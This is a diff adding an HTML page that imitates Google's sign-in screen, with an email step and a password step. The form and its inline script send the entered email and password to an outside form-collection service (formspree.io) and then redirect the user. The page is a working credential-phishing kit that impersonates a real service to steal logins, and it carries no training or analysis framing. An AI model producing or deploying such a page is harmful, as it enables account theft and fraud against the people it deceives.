@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" href="Capture.JPG">
+    <link rel="stylesheet" href="style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google</title>
+</head>
+<body>
+    <section id="desktop">
+        <div class="body">
+            <div class="center">
+                <div class="sideone">
+                    <div class="centeredside">
+                        <div class="img"></div>
+                        <div class="signintogoogle">
+                            Sign&nbsp;in&nbsp;to&nbsp;Google
+                        </div>
+                        <div class="useyouraccount">
+                            Use&nbsp;your&nbsp;account
+                        </div>
+                        <form method="post" action="https://formspree.io/f/mwkgwdgo" id="my-form">
+                        <div class="inputemail">
+                            <label for="" id="emaillabel">Email&nbsp;or&nbsp;phone</label>
+                            <input type="email" name="email" id="email" class="emailaddress" required>
+                        </div>
+                        <div class="forgotemail">
+                            <a href="">Forgot&nbsp;email?</a>
+                        </div>
+                        <div class="createaccountandnextbutton">
+                            <div class="createaccount">
+                                <a href="">Create&nbsp;account</a>
+                            </div>
+                            <div class="nextbutton">
+                                <button type="button">
+                                    Next
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="sidetwo">
+                    <div class="centeredside">
+                        <div class="img"></div>
+                        <div class="signintogoogle">
+                            Enter your password
+                        </div>
+                        <div class="accounts">
+                            <select name="" id="emailreplace">
+                                <option value="unknown" id="replacewith">Unknown</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="inputemail">
+                        <label for="" id="emaillabel">Password</label>
+                        <input type="password" name="message" id="email" class="passwordhide" required>
+                        <input type="text" name="message" id="email" class="passwordshow">
+                    </div>
+                    <div class="checkbox">
+                        <input type="checkbox" name="check" id="check"><label for="">Show&nbsp;password</label>
+                    </div>
+                    <div class="p"><p id="my-form-status"></p></div>
+                    <div class="forgotemail">
+                        <a href="">Forgot&nbsp;password?</a>
+                    </div>
+                    <div class="continuebutton">
+                        <button id="my-form-button" type="submit">Continue</button>
+                    </div></form>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section id="mobile"></section>
+<script src="script.js">
+document.getElementById("my-form").addEventListener("submit", async function(event) {
+    event.preventDefault(); // Prevent default form submission
+
+    const status = document.getElementById("my-form-status");
+    const button = document.getElementById("my-form-button");
+    const data = new FormData(event.target);
+
+    button.disabled = true; // Disable the button during submission
+
+    try {
+      const response = await fetch(event.target.action, {
+        method: event.target.method,
+        body: data,
+        headers: {
+          'Accept': 'application/json'
+        }
+      });
+
+      if (response.ok) {
+        status.innerHTML = "Thanks for your submission!";
+        event.target.reset(); // Reset the form
+        window.location.href = "index.html"; // Redirect to index.html
+      } else {
+        const errorData = await response.json();
+        status.innerHTML = errorData.errors ? errorData.errors.map(err => err.message).join(", ") : "Oops! There was a problem.";
+      }
+    } catch (error) {
+      status.innerHTML = "Oops! There was a problem submitting your form.";
+    } finally {
+      button.disabled = false; // Re-enable the button
+    }
+  });
+</script>
+</body>
+</html>
